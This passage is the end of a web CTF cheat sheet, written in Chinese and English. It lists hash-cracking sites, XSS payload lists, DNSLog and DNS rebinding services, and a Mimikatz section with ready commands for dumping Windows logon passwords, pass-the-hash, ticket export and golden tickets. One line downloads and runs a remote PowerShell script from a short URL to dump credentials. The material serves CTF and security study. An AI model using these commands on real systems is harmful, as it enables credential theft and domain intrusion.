- https://buckets.grayhatwarfare.com/

## Hash Crack

- http://cmd5.com

- https://somd5.com/

- https://crackstation.net/

- https://hashkiller.co.uk/

## 其它

- https://3v4l.org/
    - php eval

- https://github.com/denny0223/scrabble
    - git

- https://github.com/lijiejie/ds_store_exp
    - .DS_Store 

- https://github.com/kost/dvcs-ripper
    - git / svn / hg / cvs ...

- http://www.factordb.com/

- unicode converter
    - https://www.branah.com/unicode-converter

- PHP混淆 / 加密
    - http://enphp.djunny.com/
    - http://www.phpjm.net/

- https://github.com/PowerShellMafia/PowerSploit

- https://github.com/swisskyrepo/PayloadsAllTheThings/

- http://xssor.io

- https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt
    - XSS Payloads

- DNSLog
    - http://ceye.io
    - https://www.t00ls.net/dnslog.html
    - http://dnsbin.zhack.ca/
    - http://requestbin.net/dns

- DNS rebinding
    - rebind.network
        - ```
            # butit still works
            A.192.168.1.1.forever.rebind.network
            
            #alternate between localhost and 10.0.0.1 forever
            A.127.0.0.1.1time.10.0.0.1.1time.repeat.rebind.network
            
            #first respond with 192.168.1.1 then 192.168.1.2. Now respond 192.168.1.3forever.
            A.192.168.1.1.1time.192.168.1.2.2times.192.168.1.3.forever.rebind.network
            
            #respond with 52.23.194.42 the first time, then whatever `whonow--default-address`
            # isset to forever after that (default: 127.0.0.1)
            A.52.23.194.42.1time.rebind.network
          ```
  - rbndr.us
      - `36573657.7f000001.rbndr.us`
  - Example
      - [BalsnCTF 2019 - 卍乂Oo韓國魚oO乂卍](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2019#%E5%8D%8D%E4%B9%82oo%E9%9F%93%E5%9C%8B%E9%AD%9Aoo%E4%B9%82%E5%8D%8D-koreanfish)
      - [DEFCON CTF 2019 Qual - ooops](https://balsn.tw/ctf_writeup/20190513-defconctfqual/#solution-2:-dns-rebinding)

- https://r12a.github.io/apps/encodings/
    - Encoding converter 

- http://tool.leavesongs.com/

- Mimikatz
    - 撈密碼
        - `mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit >> log.txt`
        - powershell 無文件: `powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"`
    - Pass The Hash
        - `sekurlsa::pth /user:Administrator /domain:kaibro.local /ntlm:cc36cf7a8514893efccd332446158b1a`
        - `sekurlsa::pth /user:Administrator /domain:kaibro.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9`
        - `sekurlsa::pth /user:Administrator /domain:kaibro.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9`
    - TGT
        - `kerberos::tgt` (Displays informations about the TGT of the current session)
    - List / Export Kerberos tickets of all sessions
        - `sekurlsa::tickets /export`
    - Pass The Ticket
        - `kerberos::ptt Administrator@krbtgt-KAIBRO.LOCAL.kirbi`
    - Golden
        - generate the TGS with NTLM: `kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>`
        - generate the TGS with AES 128 key: `kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>`
        - generate the TGS with AES 256 key: `kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>`
    - Purge
        - `kerberos::purge` (Purges all tickets of the current session)
- WASM
    - https://wasdk.github.io/WasmFiddle/
    - https://webassembly.studio/
    - https://github.com/WebAssembly/wabt

----

# Contributing

Welcome to open Pull Request

OR

[![Buy me a coffee](https://www.buymeacoffee.com/assets/img/custom_images/black_img.png)](https://www.buymeacoffee.com/kaibrotw)


[![Stargazers over time](https://starchart.cc/w181496/Web-CTF-Cheatsheet.svg)](https://starchart.cc/w181496/Web-CTF-Cheatsheet)

